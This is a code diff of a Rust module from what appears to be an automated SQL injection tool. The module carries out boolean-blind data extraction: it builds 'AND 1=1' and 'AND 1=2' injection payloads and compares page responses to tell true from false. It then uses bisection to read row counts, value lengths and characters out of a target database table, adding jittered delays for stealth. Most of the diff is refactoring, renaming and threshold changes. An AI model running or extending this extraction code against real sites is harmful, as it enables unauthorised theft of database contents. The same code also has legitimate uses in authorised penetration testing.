@@ -1,17 +1,17 @@
 //! Boolean-blind data extraction: bisection algorithm for extracting
 //! strings and numbers using TRUE/FALSE page-difference oracle.
 
-use std::time::{Duration, Instant};
 use anyhow::Result;
+use std::time::Instant;
 use tracing::{debug, info};
 
 use crate::sqx::{
     detector::SqliDetector,
     models::{
-        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
-        CancellationToken, ExtractionStatus, HttpResponse,
+        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult, CancellationToken,
+        ExtractionStatus, HttpResponse,
     },
-    payload_fetcher::{BOUNDARIES, DynamicPayloads},
+    payloads::{PayloadDatabase, BOUNDARIES},
     similarity::calculate_similarity,
 };
 
@@ -38,8 +38,8 @@ impl SqliDetector {
         let mut total_requests = 0;
         let mut extracted_values = Vec::new();
 
-        let dynamic = DynamicPayloads::load();
-        let sqlmap_test = payload_id.and_then(|id| dynamic.tests.iter().find(|t| t.title == id));
+        let dynamic = PayloadDatabase::load();
+        let sqlmap_test = payload_id.and_then(|id| dynamic.dynamic.tests.iter().find(|t| t.title == id));
         let vector = sqlmap_test.map(|t| t.vector.clone());
 
         info!(
@@ -48,14 +48,15 @@ impl SqliDetector {
         );
 
         if let Some(ref token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(BlindExtractionResult {
-                    extracted_values: vec![],
-                    total_requests: 0,
-                    extraction_time_secs: 0,
-                    technique_used: "Cancelled".to_string(),
-                });
-            }
+            && token.is_cancelled()
+        {
+            return Ok(BlindExtractionResult {
+                extracted_values: vec![],
+                total_requests: 0,
+                extraction_time_secs: 0,
+                technique_used: "Cancelled".to_string(),
+            });
+        }
 
         if let Some(ref callback) = progress_callback {
             callback(BlindExtractionProgress {
@@ -71,7 +72,7 @@ impl SqliDetector {
 
         // Discover boundary if no hint provided.
         let (close, balance) = if let Some(hint) = boundary_hint {
-            if let Some((c, b)) = DynamicPayloads::find_boundary(hint) {
+            if let Some((c, b)) = PayloadDatabase::find_boundary_static(hint) {
                 info!("Using hinted boundary '{}' for blind extraction", hint);
                 (c, b)
             } else {
@@ -94,8 +95,16 @@ impl SqliDetector {
 
         let row_count = self
             .get_row_count_blind(
-                url, param, original_value, extraction_config, baseline,
-                &close, &balance, vector.as_deref(), &mut total_requests, cancel_token.as_ref(),
+                url,
+                param,
+                original_value,
+                extraction_config,
+                baseline,
+                &close,
+                &balance,
+                vector.as_deref(),
+                &mut total_requests,
+                cancel_token.as_ref(),
             )
             .await?;
 
@@ -104,16 +113,27 @@ impl SqliDetector {
 
         for row_index in 0..rows_to_extract {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    info!("Extraction cancelled after {} rows", row_index);
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                info!("Extraction cancelled after {} rows", row_index);
+                break;
+            }
 
             let value = self
                 .extract_string_blind(
-                    url, param, original_value, dbms, extraction_config, baseline,
-                    row_index, &close, &balance, vector.as_deref(), &mut total_requests,
-                    progress_callback.as_ref(), cancel_token.as_ref(),
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    extraction_config,
+                    baseline,
+                    row_index,
+                    &close,
+                    &balance,
+                    vector.as_deref(),
+                    &mut total_requests,
+                    progress_callback.as_ref(),
+                    cancel_token.as_ref(),
                 )
                 .await?;
 
@@ -132,7 +152,10 @@ impl SqliDetector {
         }
 
         let elapsed = start_time.elapsed();
-        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);
+        let is_cancelled = cancel_token
+            .as_ref()
+            .map(|t| t.is_cancelled())
+            .unwrap_or(false);
 
         info!(
             "Blind extraction {}: {} values in {} requests ({:?})",
@@ -162,10 +185,19 @@ impl SqliDetector {
         let is_numeric = original_value.parse::<i64>().is_ok();
 
         for boundary in BOUNDARIES.iter() {
-            if !is_numeric && boundary.close.is_empty() { continue; }
+            if !is_numeric && boundary.close.is_empty() {
+                continue;
+            }
 
             if let Some(result) = self
-                .try_boolean_pair_blind(url, param, original_value, baseline, boundary.close, boundary.balance)
+                .try_boolean_pair_blind(
+                    url,
+                    param,
+                    original_value,
+                    baseline,
+                    boundary.close,
+                    boundary.balance,
+                )
                 .await
             {
                 if result {
@@ -179,15 +211,35 @@ impl SqliDetector {
                     )));
                 }
             }
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
-        let dynamic = DynamicPayloads::load();
-        for b in &dynamic.boundaries {
-            if !is_numeric && b.prefix.is_empty() { continue; }
+        let dynamic = PayloadDatabase::load();
+        for b in &dynamic.dynamic.boundaries {
+            if !is_numeric && b.prefix.is_empty() {
+                continue;
+            }
 
-            let prefix = DynamicPayloads::resolve_placeholders(&b.prefix, 42, "sqx", original_value, "1=1", 5);
-            let suffix = DynamicPayloads::resolve_placeholders(&b.suffix, 42, "sqx", original_value, "1=1", 5);
+            let prefix = crate::sqx::payloads::resolve_placeholders(
+                &b.prefix,
+                42,
+                "sqx",
+                original_value,
+                "1=1",
+                5,
+            );
+            let suffix = crate::sqx::payloads::resolve_placeholders(
+                &b.suffix,
+                42,
+                "sqx",
+                original_value,
+                "1=1",
+                5,
+            );
 
             if let Some(result) = self
                 .try_boolean_pair_blind(url, param, original_value, baseline, &prefix, &suffix)
@@ -201,7 +253,11 @@ impl SqliDetector {
                     return Ok(Some((prefix, suffix)));
                 }
             }
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
         Ok(None)
@@ -218,19 +274,21 @@ impl SqliDetector {
         close: &str,
         balance: &str,
     ) -> Option<bool> {
-        let true_payload  = format!("{}{} AND 1=1 {}",
-            original_value, close, balance);
-        let false_payload = format!("{}{} AND 1=2 {}",
-            original_value, close, balance);
+        let true_payload = format!("{}{} AND 1=1 {}", original_value, close, balance);
+        let false_payload = format!("{}{} AND 1=2 {}", original_value, close, balance);
 
-        let true_url  = self.build_test_url(url, param, original_value, &true_payload);
+        let true_url = self.build_test_url(url, param, original_value, &true_payload);
         let true_resp = self.send_request(&true_url).await.ok()?;
-        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+        tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+            self.config.delay_ms,
+            self.config.stealth.jitter_pct,
+        ))
+        .await;
 
-        let false_url  = self.build_test_url(url, param, original_value, &false_payload);
+        let false_url = self.build_test_url(url, param, original_value, &false_payload);
         let false_resp = self.send_request(&false_url).await.ok()?;
 
-        let true_sim  = calculate_similarity(&baseline.body, &true_resp.body);
+        let true_sim = calculate_similarity(&baseline.body, &true_resp.body);
         let false_sim = calculate_similarity(&baseline.body, &false_resp.body);
         let gap = true_sim - false_sim;
 
@@ -256,15 +314,31 @@ impl SqliDetector {
         cancel_token: Option<&CancellationToken>,
     ) -> Result<usize> {
         if let Some(token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(0);
-            }
+            && token.is_cancelled()
+        {
+            return Ok(0);
+        }
+
+        if config.custom_query.is_some() {
+            // Custom-query extraction is currently a scalar workflow.
+            return Ok(1);
+        }
 
         let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
         let count = self
             .extract_number_blind(
-                url, param, original_value, &query, baseline,
-                close, balance, vector, 0, 1000, request_count, cancel_token,
+                url,
+                param,
+                original_value,
+                &query,
+                baseline,
+                close,
+                balance,
+                vector,
+                0,
+                1000,
+                request_count,
+                cancel_token,
             )
             .await?;
 
@@ -305,15 +379,26 @@ impl SqliDetector {
         };
 
         if let Some(token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(String::new());
-            }
+            && token.is_cancelled()
+        {
+            return Ok(String::new());
+        }
 
         let length_query = format!("LENGTH({})", subquery);
         let length = self
             .extract_number_blind(
-                url, param, original_value, &length_query, baseline,
-                close, balance, vector, 0, config.max_length_per_value as i32, request_count, cancel_token,
+                url,
+                param,
+                original_value,
+                &length_query,
+                baseline,
+                close,
+                balance,
+                vector,
+                0,
+                config.max_length_per_value as i32,
+                request_count,
+                cancel_token,
             )
             .await?;
 
@@ -329,11 +414,17 @@ impl SqliDetector {
         let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(8));
         let mut set = tokio::task::JoinSet::new();
         let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
-        let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
+        let dialect = dialect_box
+            .as_deref()
+            .unwrap_or(&crate::sqx::dbms::major::MySQL);
         let vector_owned = vector.map(|s| s.to_string());
 
         for pos in 1..=length {
-            if cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
+            if cancel_token
+                .as_ref()
+                .map(|t| t.is_cancelled())
+                .unwrap_or(false)
+            {
                 break;
             }
 
@@ -359,11 +450,22 @@ impl SqliDetector {
             set.spawn(async move {
                 let _permit = permit;
                 let mut local_reqs = 0usize;
-                let ascii_val = detector.extract_number_blind(
-                    &url, &param, &original_value, &char_query, &baseline,
-                    &close, &balance, vector.as_deref(), 0, 127, &mut local_reqs,
-                    None, // short-lived task; cancellation checked before spawn
-                ).await?;
+                let ascii_val = detector
+                    .extract_number_blind(
+                        &url,
+                        &param,
+                        &original_value,
+                        &char_query,
+                        &baseline,
+                        &close,
+                        &balance,
+                        vector.as_deref(),
+                        0,
+                        127,
+                        &mut local_reqs,
+                        None, // short-lived task; cancellation checked before spawn
+                    )
+                    .await?;
                 Ok::<_, anyhow::Error>((pos, ascii_val, local_reqs))
             });
         }
@@ -415,15 +517,25 @@ impl SqliDetector {
 
         while low < high {
             if let Some(token) = cancel_token
-                && token.is_cancelled() {
-                    return Ok(low);
-                }
+                && token.is_cancelled()
+            {
+                return Ok(low);
+            }
 
             let mid = low + (high - low) / 2;
 
             let condition = format!("({}) > {}", query, mid);
             let is_greater = self
-                .test_condition_blind(url, param, original_value, &condition, baseline, close, balance, vector)
+                .test_condition_blind(
+                    url,
+                    param,
+                    original_value,
+                    &condition,
+                    baseline,
+                    close,
+                    balance,
+                    vector,
+                )
                 .await?;
             *request_count += 1;
 
@@ -433,7 +545,11 @@ impl SqliDetector {
                 high = mid; // value <= mid, so mid is still a candidate
             }
 
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
         Ok(low) // low == high == answer
@@ -452,9 +568,12 @@ impl SqliDetector {
         vector: Option<&str>,
     ) -> Result<bool> {
         let true_payload = if let Some(v) = vector {
-            DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, condition, 5)
+            crate::sqx::payloads::resolve_placeholders(v, 42, "sqx", original_value, condition, 5)
         } else {
-            format!("{}{} AND ({}) {}", original_value, close, condition, balance)
+            format!(
+                "{}{} AND ({}) {}",
+                original_value, close, condition, balance
+            )
         };
 
         let test_url = self.build_test_url(url, param, original_value, &true_payload);
@@ -474,13 +593,13 @@ impl SqliDetector {
 
         // Signal 3: if similarity is high but we can't be sure, use differential oracle.
         // Fetch known-TRUE and known-FALSE probes to calibrate.
-        // This costs 2 extra requests but is only triggered when similarity > 0.85,
+        // This costs 2 extra requests but is only triggered when similarity > 0.80,
         // which is when the simple threshold would be unreliable.
-        if similarity > 0.85 {
+        if similarity > 0.80 {
             let (known_true_pl, known_false_pl) = if let Some(v) = vector {
                 (
-                    DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, "1=1", 5),
-                    DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, "1=2", 5),
+                    crate::sqx::payloads::resolve_placeholders(v, 42, "sqx", original_value, "1=1", 5),
+                    crate::sqx::payloads::resolve_placeholders(v, 42, "sqx", original_value, "1=2", 5),
                 )
             } else {
                 (
@@ -489,13 +608,11 @@ impl SqliDetector {
                 )
             };
 
-            let true_url  = self.build_test_url(url, param, original_value, &known_true_pl);
+            let true_url = self.build_test_url(url, param, original_value, &known_true_pl);
             let false_url = self.build_test_url(url, param, original_value, &known_false_pl);
 
-            let (true_ref, false_ref) = tokio::join!(
-                self.send_request(&true_url),
-                self.send_request(&false_url),
-            );
+            let (true_ref, false_ref) =
+                tokio::join!(self.send_request(&true_url), self.send_request(&false_url),);
 
             if let (Ok(tr), Ok(fr)) = (true_ref, false_ref) {
                 let gap = calculate_similarity(&baseline.body, &tr.body)
@@ -504,7 +621,7 @@ impl SqliDetector {
                 if gap > 0.02 {
                     // The target has a detectable TRUE/FALSE difference.
                     // Classify by proximity: which reference is the probe closer to?
-                    let sim_to_true  = calculate_similarity(&tr.body, &response.body);
+                    let sim_to_true = calculate_similarity(&tr.body, &response.body);
                     let sim_to_false = calculate_similarity(&fr.body, &response.body);
                     return Ok(sim_to_true >= sim_to_false);
                 }
@@ -515,6 +632,6 @@ impl SqliDetector {
             }
         }
 
-        Ok(similarity > 0.9)
+        Ok(similarity > 0.75)
     }
 }
